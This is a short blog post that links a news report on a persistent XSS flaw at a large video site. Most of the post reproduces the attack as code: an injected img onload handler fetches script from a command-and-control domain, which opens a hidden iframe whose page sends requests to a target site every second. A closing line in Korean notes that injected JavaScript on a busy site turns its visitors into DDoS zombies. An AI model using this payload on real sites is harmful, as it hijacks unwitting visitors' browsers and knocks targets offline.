---
layout: post
title: "DDoS using a persistent XSS"
date: 2014-05-14 11:48:16 +0900
comments: true
categories: 
---

[Vulnerability in World Largest Video Site Turned Million of Visitors into DDoS Zombies](http://thehackernews.com/2014/04/vulnerability-in-worlds-largest-site.html)

    // JS injection in <img> tag enabled by Persistent XSS
    <img src="/imagename.jpg" onload="$.getScript('http://c&cdomain.com/inject-iframe.html')>

    // inject-iframe.html
    // Malicious JS opens hidden <iframe>
    $("body").append("<iframe id='ifr11323' style='display:none;' src='http://c&cdomain.com/ddos.html'></iframe>");

    // ddos.html
    // Ajax DDoS script
    <html><body>
    <h1>iframe</h1>
    <script>
    ddos('http://www.target1.com');
    function ddos(url) {
        window.setInterval( function() { $.getScript(url); }, 1000);
    }
    </script>
    </body></html>

사람들의 방문이 많은 사이트에 자바스크립트를 업로드할 수 있다면, 방문자의 브라우저를 DDoS 좀비로 만들 수 있다.
